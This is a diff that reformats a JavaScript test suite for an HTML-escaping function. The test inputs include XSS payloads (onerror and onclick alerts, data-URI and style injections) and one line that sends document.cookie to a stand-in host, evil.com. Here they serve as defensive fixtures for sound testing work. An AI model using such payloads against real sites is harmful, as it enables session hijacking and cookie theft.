@@ -71,7 +71,7 @@ describe('HtmlUtils', () => {
       expect(result).toBe('She said &quot;Hello&quot;');
     });
 
-    it('should escape single quotes (\')', () => {
+    it("should escape single quotes (')", () => {
       const result = escapeHtml("It's a test");
       expect(result).toBe('It&#039;s a test');
     });
@@ -95,7 +95,9 @@ describe('HtmlUtils', () => {
 
     it('should prevent img tag with onerror injection', () => {
       const result = escapeHtml('<img src="x" onerror="alert(\'XSS\')">');
-      expect(result).toBe('&lt;img src=&quot;x&quot; onerror=&quot;alert(&#039;XSS&#039;)&quot;&gt;');
+      expect(result).toBe(
+        '&lt;img src=&quot;x&quot; onerror=&quot;alert(&#039;XSS&#039;)&quot;&gt;'
+      );
       expect(result).not.toContain('<img');
     });
 
@@ -107,7 +109,9 @@ describe('HtmlUtils', () => {
 
     it('should prevent onclick attribute injection', () => {
       const result = escapeHtml('<div onclick="alert(\'XSS\')">Click me</div>');
-      expect(result).toBe('&lt;div onclick=&quot;alert(&#039;XSS&#039;)&quot;&gt;Click me&lt;/div&gt;');
+      expect(result).toBe(
+        '&lt;div onclick=&quot;alert(&#039;XSS&#039;)&quot;&gt;Click me&lt;/div&gt;'
+      );
       expect(result).not.toContain('<div');
     });
 
@@ -198,7 +202,9 @@ describe('HtmlUtils', () => {
 
     it('should handle mixed special characters multiple times', () => {
       const result = escapeHtml('A&B<C>D"E\'F & G < H > I " J \' K');
-      expect(result).toBe('A&amp;B&lt;C&gt;D&quot;E&#039;F &amp; G &lt; H &gt; I &quot; J &#039; K');
+      expect(result).toBe(
+        'A&amp;B&lt;C&gt;D&quot;E&#039;F &amp; G &lt; H &gt; I &quot; J &#039; K'
+      );
     });
   });
 
@@ -240,7 +246,9 @@ describe('HtmlUtils', () => {
     it('should escape malicious user input in chat messages', () => {
       const userInput = '<img src=x onerror="fetch(\'evil.com?cookie=\'+document.cookie)">';
       const result = escapeHtml(userInput);
-      expect(result).toBe('&lt;img src=x onerror=&quot;fetch(&#039;evil.com?cookie=&#039;+document.cookie)&quot;&gt;');
+      expect(result).toBe(
+        '&lt;img src=x onerror=&quot;fetch(&#039;evil.com?cookie=&#039;+document.cookie)&quot;&gt;'
+      );
       expect(result).not.toContain('<img');
       expect(result).not.toContain('onerror="');
     });
@@ -284,7 +292,9 @@ describe('HtmlUtils', () => {
 
     it('should prevent data URI injection', () => {
       const result = escapeHtml('<a href="data:text/html,<script>alert(1)</script>">Link</a>');
-      expect(result).toBe('&lt;a href=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;Link&lt;/a&gt;');
+      expect(result).toBe(
+        '&lt;a href=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;Link&lt;/a&gt;'
+      );
     });
 
     it('should prevent SVG injection', () => {
@@ -294,7 +304,9 @@ describe('HtmlUtils', () => {
 
     it('should prevent style tag injection', () => {
       const result = escapeHtml('<style>body{background:url("javascript:alert(1)")}</style>');
-      expect(result).toBe('&lt;style&gt;body{background:url(&quot;javascript:alert(1)&quot;)}&lt;/style&gt;');
+      expect(result).toBe(
+        '&lt;style&gt;body{background:url(&quot;javascript:alert(1)&quot;)}&lt;/style&gt;'
+      );
     });
 
     it('should escape already-escaped entities (double escaping)', () => {
